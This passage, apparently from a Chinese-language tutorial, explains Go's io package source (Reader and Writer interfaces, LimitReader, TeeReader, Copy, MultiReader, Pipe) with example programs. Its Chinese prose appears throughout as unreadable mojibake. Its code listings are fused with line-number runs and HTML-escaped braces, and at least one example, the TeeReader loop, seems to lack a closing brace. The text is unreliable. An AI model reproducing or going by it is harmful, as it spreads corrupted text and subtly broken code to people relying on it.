æ­¤é™¤éå¦è¡Œé€šçŸ¥ï¼Œå¦åˆ™å®¢æˆ·ç«¯ä¸åº”å‡å®šå®ƒä»¬å¯¹äºå¹¶è¡Œæ‰§è¡Œæ˜¯å®‰å…¨çš„ã€‚ io.goæºç åˆ†ææˆ‘ä»¬å…ˆä»IOåŒ…çš„æ ¸å¿ƒæ–‡ä»¶io.goå¼€å§‹è¯»èµ·, è¯¥æ–‡ä»¶ä¸»è¦å®šä¹‰äº†å•è·¯è¯»å†™çš„ç›¸å…³è§„èŒƒ åŸºç¡€IOæ¥å£çš„å®šä¹‰åŸºç¡€æ¥å£æ¶‰åŠåˆ°è¯»ï¼Œå†™ï¼Œå…³é—­ï¼Œä»¥åŠæŒ‡é’ˆä½ç½®è¿™4ä¸ªæ–¹é¢ã€‚ Reader: æ•°æ®è¯»å–çš„æ–¹æ³•: Read, å¦‚æœå¯¹è±¡æ˜¯ä¸€ä¸ªReaderå¯¹è±¡,é‚£ä¹ˆæˆ‘ä»¬å°±èƒ½è°ƒç”¨Readè¯»å–å…¶ä¸­çš„æ•°æ®ã€‚ ReadAt: ä»åç§»é‡offå¤„å¼€å§‹è¯»å–æ•°æ®çš„æ–¹æ³•: ReadAt ReaderFrom: ä»ä¸€ä¸ªReaderå¯¹è±¡ä¸­è¯»å…¥æ•°æ®: ReaderFrom, æ–¹ä¾¿å¯¹è±¡ä¹‹é—´çš„æ•°æ®è¯»å–ã€‚ Writer: å®šä¹‰äº†æ•°æ®å†™å…¥çš„æ–¹æ³•: Write, å¦‚æœå¯¹è±¡æ˜¯ä¸€ä¸ªWriterå¯¹è±¡, é‚£ä¹ˆæˆ‘ä»¬å°±èƒ½è°ƒç”¨Writeå¾€è¯¥å¯¹è±¡å†™å…¥æ•°æ®ã€‚ WriterAt: ä»åç§»é‡offå¤„å¼€å§‹å†™å…¥æ•°æ®çš„æ–¹æ³•: WriterAt WriterTo: å¾€ä¸€ä¸ªWriterå¯¹è±¡ä¸­å†™å…¥æ•°æ®: WriterTo, æ–¹ä¾¿å¯¹è±¡ä¹‹é—´çš„æ•°æ®å†™å…¥ã€‚ Closer: å®šä¹‰äº†å…³é—­æ•°æ®æµçš„æ–¹æ³•ã€‚ Seeker: å®šä¹‰è®¾ç½®è¯»å†™æ—¶ åç§»é‡(åç§»æŒ‡é’ˆ)çš„å€¼ã€‚ è¯»æ¥å£å’Œå‡½æ•°1234567891011type Reader interface &#123; Read(p []byte) (n int, err error)&#125;type ReaderAt interface &#123; ReadAt(p []byte, off int64) (n int, err error)&#125;type WriterTo interface &#123; WriteTo(w Writer) (n int64, err error)&#125; Read: å°†len(p)ä¸ªå­—èŠ‚è¯»å–åˆ°pä¸­ã€‚å®ƒè¿”å›è¯»å–çš„å­—èŠ‚æ•°nï¼ˆ0 &lt;= n &lt;= len(p)ï¼‰ä»¥åŠä»»ä½•é‡åˆ°çš„é”™è¯¯, ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“Readæ–¹æ³•è¿”å›é”™è¯¯æ—¶ï¼Œä¸ä»£è¡¨æ²¡æœ‰è¯»å–åˆ°ä»»ä½•æ•°æ®ã€‚è°ƒç”¨è€…åº”è¯¥å¤„ç†è¿”å›çš„ä»»ä½•æ•°æ®ï¼Œä¹‹åæ‰å¤„ç†å¯èƒ½çš„é”™è¯¯ã€‚ ReadAt: ä»åŸºæœ¬è¾“å…¥æºçš„åç§»é‡offå¤„å¼€å§‹ï¼Œå°†len(p)ä¸ªå­—èŠ‚è¯»å–åˆ°pä¸­ã€‚å®ƒè¿”å›è¯»å–çš„å­—èŠ‚æ•°nï¼ˆ0 &lt;= n &lt;= len(p)ï¼‰ä»¥åŠä»»ä½•é‡åˆ°çš„é”™è¯¯ã€‚ WriterTo: å°†æ•°æ®å†™å…¥wä¸­ï¼Œç›´åˆ°æ²¡æœ‰æ•°æ®å¯å†™æˆ–å‘ç”Ÿé”™è¯¯ã€‚å…¶è¿”å›å€¼nä¸ºå†™å…¥çš„å­—èŠ‚æ•°ã€‚ åœ¨å†™å…¥è¿‡ç¨‹ä¸­é‡åˆ°çš„ä»»ä½•é”™è¯¯ä¹Ÿå°†è¢«è¿”å›, è¿™ä¸ªå’ŒReadFromå¯¹æ¯”ç€çœ‹, ReadFromä»Readerå¯¹è±¡ä¸­ç›´æ¥è¯»å–æ•°æ®ï¼Œè€ŒWriterToå¯ä»¥ç›´æ¥å¾€ä¸€ä¸ªWriterä¸­å†™å…¥æ•°æ®.stringsçš„readerå®ç°äº†è¿™3ä¸ªæ¥å£ï¼Œä»¥ä»–ä¸ºä¾‹,å…·ä½“å¯ä»¥å‚è€ƒstrings readerçš„æºç .1234567891011121314151617181920212223242526272829package mainimport ( "fmt" "os" "strings")func main() &#123; content := "example for io.Read, io.ReadAt, io.WriteTo" reader := strings.NewReader(content) read := make([]byte, 50) readAt := make([]byte, 50) // é€šè¿‡Readè¯»å–æ‰€æœ‰æ•°æ®,å¦‚æœè¯»å–å®Œæˆï¼Œè¯»æŒ‡é’ˆå·²ç»ç§»åˆ°æœ€å // é€šè¿‡Lenå¯ä»¥çŸ¥é“è¿˜å‰©å¤šå°‘æ²¡è¯»ï¼Œå› ä¸ºæŒ‡é’ˆä½ç½®Readeræ²¡æœ‰å®ç°æš´éœ² reader.Read(read) fmt.Println("read:", string(read)) fmt.Println("unread:", reader.Len()) // é€šè¿‡ReadAtä»ç¬¬9ä¸ªå­—ç¬¦å¼€å§‹è¯»å–,ä½†æ˜¯æ²¡æœ‰ç§»åˆ°è¯»æŒ‡é’ˆçš„ä½ç½®(io.ReadAtçš„è§„èŒƒ) reader.ReadAt(readAt, 8) fmt.Println("readAt:", string(readAt)) // ç”±äºè¯»æŒ‡é’ˆå·²ç»ç§»åˆ°æœ€å, æ‰€ä»¥éœ€è¦æ¢å¤ // å°†readerçš„æ•°æ®ç›´æ¥è¾“å‡ºç»™writer, reader.Seek(0, 0) reader.WriteTo(os.Stdout)&#125; è·ŸReaderæœ‰å…³çš„å‡½æ•°:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162// LimitReaderfunc LimitReader(r Reader, n int64) Reader &#123; return &amp;LimitedReader&#123;r, n&#125; &#125;type LimitedReader struct &#123; R Reader // underlying reader N int64 // max bytes remaining&#125;func (l *LimitedReader) Read(p []byte) (n int, err error) &#123; if l.N &lt;= 0 &#123; return 0, EOF &#125; if int64(len(p)) &gt; l.N &#123; p = p[0:l.N] &#125; n, err = l.R.Read(p) l.N -= int64(n) return&#125;// TeeReaderfunc TeeReader(r Reader, w Writer) Reader &#123; return &amp;teeReader&#123;r, w&#125;&#125;type teeReader struct &#123; r Reader w Writer&#125;func (t *teeReader) Read(p []byte) (n int, err error) &#123; n, err = t.r.Read(p) if n &gt; 0 &#123; if n, err := t.w.Write(p[:n]); err != nil &#123; return n, err &#125; &#125; return&#125;// ReadAtLeastfunc ReadAtLeast(r Reader, buf []byte, min int) (n int, err error) &#123; if len(buf) &lt; min &#123; return 0, ErrShortBuffer &#125; for n &lt; min &amp;&amp; err == nil &#123; var nn int nn, err = r.Read(buf[n:]) n += nn &#125; if n &gt;= min &#123; err = nil &#125; else if n &gt; 0 &amp;&amp; err == EOF &#123; err = ErrUnexpectedEOF &#125; return&#125;// ReadFullfunc ReadFull(r Reader, buf []byte) (n int, err error) &#123; return ReadAtLeast(r, buf, len(buf))&#125; LimitReader: è¿”å›ä¸€ä¸ªLimitReaderç»“æ„ä½“, ä»Rè¯»å–ä½†å°†è¿”å›çš„æ•°æ®é‡é™åˆ¶ä¸ºNå­—èŠ‚ã€‚æ¯è°ƒç”¨ä¸€æ¬¡Readéƒ½å°†æ›´æ–°Næ¥ååº”æ–°çš„å‰©ä½™æ•°é‡ã€‚å¦‚æœä½ çš„è¯»bufå¤§äºé™åˆ¶çš„é•¿åº¦, å°†ä¸€æ¬¡è¯»å–å®Œ, å¦‚æœä½ çš„bufå°äºé™åˆ¶é•¿åº¦, åˆ™åªæœ‰å¤šæ¬¡å¾ªç¯è¯»å–, ä»è€Œèµ·åˆ°é™åˆ¶è¯»å–çš„ä½œç”¨ã€‚ 1234567891011121314151617181920212223package mainimport ( "fmt" "io" "strings")func main() &#123; content := "This is limitReader example" reader := strings.NewReader(content) i := 1 // ä¸åšé™åˆ¶ï¼Œè¯»å–æ‰€æœ‰çš„å†…å®¹ limitReader := &amp;io.LimitedReader&#123;R: reader, N: int64(len(content))&#125; for limitReader.N &gt; 0 &#123; // é™åˆ¶æ€§è¯»å–, ä¸€æ¬¡è¯»å–4å­—èŠ‚ tmp := make([]byte, 4) limitReader.Read(tmp) fmt.Printf("ç¬¬%dæ¬¡: %s\n", i, tmp) i++ &#125;&#125; TeeReader: è¿”å›ä¸€ä¸ª Readerï¼Œå®ƒå°†ä»rä¸­è¯»åˆ°çš„æ•°æ®å†™å…¥wä¸­ã€‚æ‰€æœ‰ç»ç”±å®ƒå¤„ç†çš„ä»rçš„è¯»å–éƒ½åŒ¹é…äºå¯¹åº”çš„å¯¹wçš„å†™å…¥ã€‚å®ƒæ²¡æœ‰å†…éƒ¨ç¼“å­˜ï¼Œå³å†™å…¥å¿…é¡»åœ¨è¯»å–å®Œæˆå‰å®Œæˆã€‚ä»»ä½•åœ¨å†™å…¥æ—¶é‡åˆ°çš„é”™è¯¯éƒ½å°†ä½œä¸ºè¯»å–é”™è¯¯è¿”å›,ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬é€šè¿‡Readerè¯»å–å†…å®¹åï¼Œä¼šè‡ªåŠ¨å†™å…¥åˆ°Writerä¸­å» 12345678910111213141516171819202122232425262728293031package mainimport ( "fmt" "io" "os" "strings")func main() &#123; var ( err error nn int n int ) content := "This is teeReader example\n" // å¤åˆ¶ä¸€ä»½æµåˆ°æ ‡å‡†è¾“å‡º reader := io.TeeReader(strings.NewReader(content), os.Stdout) p := make([]byte, len(content)) n, err = reader.Read(p) // è¯»å®Œæ•°æ® for err != io.EOF &#123; nn, err = reader.Read(p[n:]) n += nn fmt.Printf("my read: %s", string(p))&#125; ReadAtLeast:å°†rè¯»å–åˆ°bufä¸­ï¼Œç›´åˆ°è¯»äº†æœ€å°‘minä¸ªå­—èŠ‚ä¸ºæ­¢,å› æ­¤bufå¿…é¡»å¤§äºæœ€å°å­—èŠ‚æ•°,ä¸ç„¶å°±ä¼šæŠ¥é”™(bufå°äº†), è¿™ä¸ªå’ŒLimitReaderåŠŸèƒ½ç±»ä¼¼, ä½†æ˜¯ ReadFull: ç²¾ç¡®åœ°ä»rä¸­å°†len(buf)ä¸ªå­—èŠ‚è¯»å–åˆ°bufä¸­,å°†bufè¯»æ»¡, å®é™…ä¸ŠReadFullå°±æ˜¯è°ƒç”¨çš„ReadAtLeastæ¥å°†bufå¡«æ»¡çš„,12345678910111213141516171819202122package mainimport ( "fmt" "io" "log" "strings")func main() &#123; content := "This is readFull example\n" p := make([]byte, len(content)) _, err := io.ReadFull(strings.NewReader(content), p) if err != nil &#123; log.Fatal(err) &#125; fmt.Printf("my read: %s", string(p))&#125; å†™æ¥å£å’Œå‡½æ•°1234567891011type Writer interface &#123; Write(p []byte) (n int, err error)&#125;type ReaderFrom interface &#123; ReadFrom(r Reader) (n int64, err error)&#125;type WriterAt interface &#123; WriteAt(p []byte, off int64) (n int, err error)&#125; Writer: å°†pä¸­len(p)ä¸ªå­—èŠ‚çš„æ•°æ®å†™å…¥åˆ°åŸºæœ¬æ•°æ®æµä¸­, å®ƒè¿”å›ä»pä¸­è¢«å†™å…¥çš„å­—èŠ‚æ•°nï¼ˆ0 &lt;= n &lt;= len(p)ï¼‰ä»¥åŠä»»ä½•é‡åˆ°çš„å¼•èµ·å†™å…¥æå‰åœæ­¢çš„é”™è¯¯. WriterAt: å’ŒReadAtç›¸å¯¹ï¼Œä»pä¸­å°†len(p)ä¸ªå­—èŠ‚å†™å…¥åˆ°åç§»é‡offå¤„çš„åŸºæœ¬æ•°æ®æµä¸­,å³ä»åç§»é‡offå¤„å¼€å§‹å†™å…¥ ReadFrom: å‡½æ•°å°†io.Readerä½œä¸ºå‚æ•°ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼ŒReadFromå¯ä»¥ä»ä»»æ„Readerå¯¹è±¡ä¸­è¯»å–æ•°æ®ï¼Œåªè¦æ¥æºå®ç°äº†io.Readeræ¥å£ã€‚æ¯”å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥ä»æ ‡å‡†è¾“å…¥ã€æ–‡ä»¶ã€å­—ç¬¦ä¸²ç­‰è¯»å–æ•°æ®ã€‚bufioå®ç°äº†Writerå’ŒReadFrom, æ²¡å®ç°WriterAt, æˆ‘è¿™é‡Œæ²¡æ‰©å±•ï¼Œå› ä¸ºWriteréƒ½åœ¨å·¥å‚æ¨¡å¼çš„ä¿æŠ¤ä¸‹ï¼Œæ‰€æœ‰å±æ€§éƒ½æ²¡æš´éœ²ï¼Œæ‰©å±•èµ·æ¥ä¸æ–¹ä¾¿:12345678910111213141516171819202122232425262728293031package mainimport ( "bufio" "fmt" "os" "strings")func main() &#123; content := "example for io.Writer, io.ReadFrom" writer := bufio.NewWriter(os.Stdout) // ç›´æ¥byteå¾€æ ‡å‡†è¾“å‡ºå†™å…¥ writer.Write([]byte(content)) writer.Flush() fmt.Println() // ä¸ºäº†æ–¹ä¾¿å…¶å®ä¹Ÿç›´æ¥ç›´æ¥å†™å…¥string writer.WriteString(content) writer.Flush() fmt.Println() // ä»Readerä¸­è¯»å‡ºæ•°æ®,ç„¶åå†å¾€æ ‡å‡†è¾“å‡ºå†™å…¥ reader := strings.NewReader(content) writer.ReadFrom(reader) writer.Flush()&#125; è·ŸWriteræœ‰å…³çš„å‡½æ•°:123456func WriteString(w Writer, s string) (n int, err error) &#123; if sw, ok := w.(stringWriter); ok &#123; return sw.WriteString(s) &#125; return w.Write([]byte(s))&#125; WriteString: å°†å­—ç¬¦ä¸²å†…å®¹å†™å…¥åˆ°writerä¸­, å¦‚æœwriterå®ç°äº†WriteStringåˆ™ç›´æ¥è°ƒç”¨å®ƒçš„æ–¹æ³•å†™å…¥,å¦‚æœæ²¡æœ‰åˆ™ç›´æ¥è°ƒç”¨Writeå¤„ç†æˆbyteså†™å…¥, å…·ä½“ä¸Šé¢å·²ç»æœ‰æ —å­äº†. å…³é—­ä¸åç§»é‡1234567891011121314type Closer interface &#123; Close() error&#125;// Seek whence values.const ( SeekStart = 0 // seek relative to the origin of the file SeekCurrent = 1 // seek relative to the current offset SeekEnd = 2 // seek relative to the end)type Seeker interface &#123; Seek(offset int64, whence int) (int64, error)&#125; Closer: è¯¥æ¥å£æ¯”è¾ƒç®€å•ï¼Œåªæœ‰ä¸€ä¸ªClose()æ–¹æ³•ï¼Œç”¨äºå…³é—­æ•°æ®æµ, æ¯”å¦‚æ•°æ®åº“è¿æ¥, æ–‡ä»¶ç­‰ã€‚ Seeker: è®¾ç½®ä¸‹ä¸€æ¬¡Readæˆ–Writeçš„åç§»é‡(offset)ï¼Œå®ƒçš„è§£é‡Šå–å†³äº whence: 0è¡¨ç¤ºç›¸å¯¹äºæ–‡ä»¶çš„èµ·å§‹å¤„ï¼Œ1è¡¨ç¤ºç›¸å¯¹äºå½“å‰çš„åç§»ï¼Œè€Œ2è¡¨ç¤ºç›¸å¯¹äºå…¶ç»“å°¾å¤„ã€‚ Seekè¿”å›æ–°çš„åç§»é‡å’Œä¸€ä¸ªé”™è¯¯ï¼Œå¦‚æœæœ‰çš„è¯ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼ŒSeekæ–¹æ³•ç”¨äºè®¾ç½®åç§»é‡çš„ï¼Œè¿™æ ·å¯ä»¥ä»æŸä¸ªç‰¹å®šä½ç½®å¼€å§‹æ“ä½œæ•°æ®æµã€‚å¬èµ·æ¥å’ŒReaderAt/WriteAtæ¥å£æœ‰äº›ç±»ä¼¼ï¼Œä¸è¿‡Seekeræ¥å£æ›´çµæ´»ï¼Œå¯ä»¥æ›´å¥½çš„æ§åˆ¶è¯»å†™æ•°æ®æµçš„ä½ç½®ã€‚1234567891011121314151617181920212223242526package mainimport ( "fmt" "log" "strings")func main() &#123; content := "å­—Seekæµ‹è¯•è¯»å–æŒ‡å®šä½ç½®çš„å­—ç¬¦" reader := strings.NewReader(content) // è¯»å–å€’æ•°ç¬¬5ä¸ªå­—ç¬¦, ç”±äºstring readerè®¾è®¡çš„åŸå›  // æ— è®ºæ˜¯ReadAt, WriteAtè¿˜æ˜¯Seekè¿™é‡Œé¢çš„offset // éƒ½æŒ‡çš„æ˜¯byteä¸ªæ•°, å¹¶ä¸”indexç´¯åŠ çš„ä¹Ÿæ˜¯byte,æ‰€ä»¥ // å°±å‘çˆ¹äº†ï¼Œè¦å–ç¬¬5ä¸ªå­—ç¬¦å®é™…ä¸Šçš„byteä½ç½®æ˜¯5*3 // æ³¨æ„utf8 æ˜¯å˜é•¿ç¼–ç çš„, æ‰€ä»¥å¹¶ä¸æ˜¯æ‰€æœ‰çš„ä¸­æ–‡éƒ½æ˜¯3å­—èŠ‚å“¦! // æ‰€æœ‰è¿™ç§æ–¹å¼æ˜¯æœ‰é—®é¢˜çš„, è¿˜æ˜¯ä»¥å­—ç¬¦ä¸ªæ•°è¿›è¡Œè®¡ç®—åˆé€‚ reader.Seek(-15, 2) r, s, err := reader.ReadRune() if err != nil &#123; log.Fatal(err) &#125; fmt.Println(s) fmt.Printf("%c\n", r)&#125; ç»„åˆè¡ç”Ÿçš„IOæ¥å£ ReadWriter ReadCloser WriteCloser ReadWriteCloser ReadSeeker WriteSeeker ReadWriteSeeker è¿™äº›éƒ½æ˜¯åŸºäºä¸Šé¢å•ä¸ªæ¥å£ç»„åˆè€Œæˆ, ç†è§£ä¸Šé¢çš„åŸºç¡€è¿‡ä¼šï¼Œè¿™ä¸ªå°±ä¸å¤šè¯´äº†ã€‚ IO Copyç›¸å…³è¿™é‡Œä¸»è¦ä»‹ç»å’ŒCopyç›¸å…³çš„å‡½æ•°:12345func CopyN(dst Writer, src Reader, n int64) (written int64, err error)func Copy(dst Writer, src Reader) (written int64, err error)func CopyBuffer(dst Writer, src Reader, buf []byte) (written int64, err error) CopyN: å°†nä¸ªå­—èŠ‚ä»srcå¤åˆ¶åˆ°dst. å®ƒè¿”å›å¤åˆ¶çš„å­—èŠ‚æ•°ä»¥åŠåœ¨å¤åˆ¶æ—¶é‡åˆ°çš„æœ€æ—©çš„é”™è¯¯. Copy: å°†srcå¤åˆ¶åˆ°dstï¼Œç›´åˆ°åœ¨srcä¸Šåˆ°è¾¾EOFæˆ–å‘ç”Ÿé”™è¯¯ã€‚å®ƒè¿”å›å¤åˆ¶çš„å­—èŠ‚æ•°ï¼Œå¦‚æœæœ‰çš„è¯ï¼Œè¿˜ä¼šè¿”å›åœ¨å¤åˆ¶æ—¶é‡åˆ°çš„ç¬¬ä¸€ä¸ªé”™è¯¯ã€‚ CopyBuffer: ç›¸å½“äº Copyï¼Œåªä¸ Copy åœ¨æ‰§è¡Œçš„è¿‡ç¨‹ä¸­ä¼šåˆ›å»ºä¸€ä¸ªä¸´æ—¶çš„ç¼“å†²åŒºæ¥ä¸­è½¬æ•°æ®ï¼Œè€Œ CopyBuffer åˆ™å¯ä»¥å•ç‹¬æä¾›ä¸€ä¸ªç¼“å†²åŒºè®©å¤šä¸ªå¤åˆ¶æ“ä½œå…±ç”¨åŒä¸€ä¸ªç¼“å†²åŒºï¼Œé¿å…æ¯æ¬¡å¤åˆ¶æ“ä½œéƒ½åˆ›å»ºæ–°çš„ç¼“å†²åŒºã€‚å¦‚æœ buf == nilï¼Œåˆ™ CopyBuffer ä¼šè‡ªåŠ¨åˆ›å»ºç¼“å†²åŒºã€‚ ä¸¾ä¸€ç»„æ —å­:12345678910111213141516171819202122232425262728293031package mainimport ( "fmt" "io" "os" "strings")func main() &#123; content := "Copyç›¸å…³æ“ä½œçš„æµ‹è¯•\n" reader := strings.NewReader(content) writer := os.Stdout // copy 10 ä¸ªå­—èŠ‚4çš„Asciiå’Œ2ä¸ªä¸­æ–‡ io.CopyN(writer, reader, 10) fmt.Println() // é‡ç½®è¯»æŒ‡é’ˆ,ä»æ–°å®Œæˆ1æ¬¡å®Œæ•´çš„copy reader.Seek(0, 0) io.Copy(writer, reader) // åˆ›å»ºä¸€ä¸ª32å­—èŠ‚çš„ç¼“å­˜ç”¨äºæ‰€æœ‰copyä½¿ç”¨,ä¸ç”¨å†å¼€è¾Ÿä¸´æ—¶ç¼“å­˜ buf := make([]byte, 32) r1 := strings.NewReader("CopyBufferæµ‹è¯•ç¬¬ä¸€æ¬¡\n") io.CopyBuffer(writer, r1, buf) r2 := strings.NewReader("CopyBufferæµ‹è¯•ç¬¬äºŒæ¬¡\n") io.CopyBuffer(writer, r2, buf)&#125; Byteå’ŒRuneç±»å‹IOç›¸å…³é’ˆå¯¹åŸºç¡€æ•°æ®ç»“æ„çš„IOè¯»å†™,å¤§æ¦‚æœ‰å¦‚ä¸‹å‡ ç±»:Byte, Rune, Section, ä¸»è¦å®šä¹‰äº†å¦‚ä½•è¯»å–ä¸€ä¸ªå­—èŠ‚å’Œä¸€ä¸ªUnicodeå­—ç¬¦çš„è§„èŒƒ, ä¸€èˆ¬åœ°ï¼Œæˆ‘ä»¬ä¸ä¼šä½¿ç”¨bytes.Bufferæ¥ä¸€æ¬¡è¯»å–æˆ–å†™å…¥ä¸€ä¸ªå­—èŠ‚, ä½†æ˜¯åœ¨å¤„ç†äºŒè¿›åˆ¶æ•°æ®å’Œæ•°æ®å‹ç¼©æ—¶ è¿™äº›æ¥å£ç”¨å¾—æ¯”è¾ƒå¤šã€‚ RuneReader: è¯»å–å•ä¸ªUTF-8å­—ç¬¦, è¿”å›å…¶runeå’Œè¯¥å­—ç¬¦å ç”¨çš„å­—èŠ‚ RuneScanner: ç›¸è¾ƒäºRuneReaderè€Œè¨€, ä»…å¢åŠ äº†ä¸€ä¸ªUnreadBytæ¥å£, UnreadByteæ–¹æ³•çš„æ„æ€æ˜¯ï¼šå°†ä¸Šä¸€æ¬¡ReadByteçš„å­—èŠ‚è¿˜åŸï¼Œä½¿å¾—å†æ¬¡è°ƒç”¨ReadByteè¿”å›çš„ç»“æœå’Œä¸Šä¸€æ¬¡è°ƒç”¨ç›¸åŒï¼Œä¹Ÿå°±æ˜¯è¯´ï¼ŒUnreadByteæ˜¯é‡ç½®ä¸Šä¸€æ¬¡çš„ReadByteã€‚æ³¨æ„ï¼ŒUnreadByteè°ƒç”¨ä¹‹å‰å¿…é¡»è°ƒç”¨äº†ReadByteï¼Œä¸”ä¸èƒ½è¿ç»­è°ƒç”¨UnreadByteã€‚ ByteReader: è¯»ä¸€ä¸ªå­—èŠ‚. ByteWriter: å†™ä¸€ä¸ªå­—èŠ‚. ByteScanner: å’ŒRuneScannerç±»ä¼¼, åªæ˜¯é’ˆå¯¹çš„å¼Byteè€Œå·². ç»“æ„ä½“ SectionReader: è¿™æ˜¯ç”¨äºè¯»å–ç£ç›˜æ‰‡åŒºçš„æ¥å£, ç”±äºåŸºæœ¬ä¸ä¼šä½¿ç”¨åˆ°, å› æ­¤ä¸åšè§£è¯»äº†. multi.goæºç åˆ†æè¯¥æ–‡ä»¶ä¸»è¦å®šä¹‰äº†å¤šè·¯è¯»å†™çš„ç›¸å…³è§„èŒƒ,è¿™é‡Œçš„å¤šè·¯æŒ‡çš„æ˜¯å¯¹å¤šä¸ªreaderæˆ–è€…å¤šä¸ªwriteråŒæ—¶çš„åŠ¨ä½œ,å®ƒä»¬æ¥æ”¶å¤šä¸ªReaderæˆ–Writerï¼Œè¿”å›ä¸€ä¸ªReaderæˆ–Writerã€‚æˆ‘ä»¬å¯ä»¥çŒœæƒ³åˆ°è¿™ä¸¤ä¸ªå‡½æ•°å°±æ˜¯æ“ä½œå¤šä¸ªReaderæˆ–Writerå°±åƒæ“ä½œä¸€ä¸ªã€‚äº‹å®ä¸Šï¼Œåœ¨ioåŒ…ä¸­å®šä¹‰äº†ä¸¤ä¸ªéå¯¼å‡ºç±»å‹ï¼šmutilReaderå’ŒmultiWriterï¼Œå®ƒä»¬åˆ†åˆ«å®ç°äº†io.Readerå’Œio.Writeræ¥å£123456789type multiReader struct &#123; readers []Reader&#125;type multiWriter struct &#123; writers []Writer&#125;func MultiReader(readers ...Reader) Reader func MultiWriter(writers ...Writer) Writer MultiReader: é€»è¾‘ä¸Šå°†å¤šä¸ªReaderç»„åˆèµ·æ¥ï¼Œè¿”å›ä¸€ä¸ªæ–°çš„Reader, ä½†æ˜¯è¿™ä¸ªæ–°Readerå¹¶ä¸èƒ½é€šè¿‡è°ƒç”¨ä¸€æ¬¡Readæ–¹æ³•è·å–æ‰€æœ‰Readerçš„å†…å®¹ã€‚å› ä¸ºå®ƒè¿™ä¸ªé€»è¾‘çœŸçš„ç‰¹åˆ«ç®€å•, å¾ªç¯è¯»å–æ‰€æœ‰çš„Reader, è¯»å®Œä¸€ä¸ªè¿”å›ä¸€ä¸ª, åªæ˜¯æ­£å¸¸è¯»å®Œè¿‡åçš„EOFè¢«é‡ç½®ä¸ºnil, è¿™æ ·çš„ç»“æœå°±æ˜¯ æˆ‘ä»¬è¿˜å¾—åœ¨å¤–é¢å†æ¬¡å¾ªç¯è¯»å–ä¸€æ¬¡, ç›´åˆ°EOF1234567891011121314151617181920212223242526272829package mainimport ( "bytes" "fmt" "io" "strings")func main() &#123; readers := []io.Reader&#123; strings.NewReader("from strings reader\n"), bytes.NewBufferString("from bytes buffer\n"), &#125; reader := io.MultiReader(readers...) data := make([]byte, 0, 1024) // å¾ªç¯è¯»å–æ¯ä¸ªreaderè¿”å›çš„å†…å®¹æ¥æ‹¼æ¥, // ç›´åˆ°æ‰€æœ‰readerè¯»å–åè¿”å›EOFåœæ­¢ for n, err := 0, error(nil); err != io.EOF; &#123; tmp := make([]byte, 512) n, err = reader.Read(tmp) data = append(data, tmp[:n]...) &#125; fmt.Printf("%s", data)&#125; åƒä¸Šé¢è¿™æ ·ä½¿ç”¨æ˜¾ç„¶æœ‰ç‚¹éº»çƒ¦, æ¯”è¾ƒæ–¹ä¾¿çš„ä½¿ç”¨æ–¹å¼è¿˜æ˜¯èšåˆè¿‡åç›´æ¥ä½¿ç”¨io.Copyæ¥æå®š12345678910111213141516171819package mainimport ( "bytes" "io" "os" "strings")func main() &#123; readers := []io.Reader&#123; strings.NewReader("from strings reader\n"), bytes.NewBufferString("from bytes buffer\n"), &#125; reader := io.MultiReader(readers...) io.Copy(os.Stdout, reader)&#125; MultiWriter: å’ŒMultiReaderç±»ä¼¼, å°†å¤šä¸ªwriterèšåˆéƒ½ä¸€ä¸ªsliceé‡Œé¢, ç„¶åç”¨forå¾ªç¯å†™, å®é™…ä¸Šå°±æ˜¯å°†å‘è‡ªèº«å†™å…¥çš„æ•°æ®åŒæ­¥å†™å…¥åˆ°æ‰€æœ‰writersä¸­1234567891011121314151617package mainimport ( "io" "os")func main() &#123; // ç›´æ¥æ¥2ä¸ªwriter writers := []io.Writer&#123; os.Stdout, os.Stderr, &#125; writer := io.MultiWriter(writers...) writer.Write([]byte("hello,world\n"))&#125; pipe.goæºç åˆ†æè¯¥æ–‡ä»¶ä¸»è¦å®šä¹‰äº†æµå¼IOçš„ç›¸å…³è§„èŒƒ,ä¸»è¦å°±æ˜¯Pipe, Pipeåœ¨å†…å­˜ä¸­åˆ›å»ºä¸€ä¸ªåŒæ­¥ç®¡é“ï¼Œç”¨äºä¸åŒåŒºåŸŸçš„ä»£ç ä¹‹é—´ç›¸äº’ä¼ é€’æ•°æ®, å› æ­¤å’Œæ— ç¼“å†²channelå¾ˆåƒï¼Œå› æ­¤ä¸èƒ½åœ¨ä¸€ä¸ªgoroutineä¸­è¿›è¡Œè¯»å’Œå†™ã€‚åŒæ · ç”±äºç®¡é“æ²¡æœ‰ç¼“å­˜åŒº, æ‰€ä»¥å’Œchannelä¸€æ · å¯¹äºè¯»å†™å’Œå…³é—­éƒ½æ˜¯ å¹¶è¡Œå®‰å…¨çš„ã€‚123456789101112131415161718192021222324252627// A pipe is the shared pipe structure underlying PipeReader and PipeWriter.type pipe struct &#123; rl sync.Mutex // gates readers one at a time wl sync.Mutex // gates writers one at a time l sync.Mutex // protects remaining fields data []byte // data remaining in pending write rwait sync.Cond // waiting reader wwait sync.Cond // waiting writer rerr error // if reader closed, error to give writes werr error // if writer closed, error to give reads&#125;// A PipeReader is the read half of a pipe.type PipeReader struct &#123; p *pipe&#125;// A PipeWriter is the write half of a pipe.type PipeWriter struct &#123; p *pipe&#125;func Pipe() (*PipeReader, *PipeWriter) &#123; p := new(pipe) p.rwait.L = &amp;p.l p.wwait.L = &amp;p.l r := &amp;PipeReader&#123;p&#125; w := &amp;PipeWriter&#123;p&#125; return r, w&#125; PipeReader: æ˜¯ç®¡é“çš„è¯»å–ç«¯ã€‚å®ƒå®ç°äº†io.Readerå’Œio.Closeræ¥å£ï¼Œå¦‚æœç®¡é“è¢«å…³é—­ï¼Œåˆ™ä¼šè¿”ä¼šä¸€ä¸ªé”™è¯¯ä¿¡æ¯ï¼š å¦‚æœå†™å…¥ç«¯é€šè¿‡ CloseWithError æ–¹æ³•å…³é—­äº†ç®¡é“ï¼Œåˆ™è¿”å›å…³é—­æ—¶ä¼ å…¥çš„é”™è¯¯ä¿¡æ¯ã€‚ å¦‚æœå†™å…¥ç«¯é€šè¿‡ Close æ–¹æ³•å…³é—­äº†ç®¡é“ï¼Œåˆ™è¿”å› io.EOFã€‚ å¦‚æœæ˜¯è¯»å–ç«¯å…³é—­äº†ç®¡é“ï¼Œåˆ™è¿”å› io.ErrClosedPipeã€‚ PipeWriter: 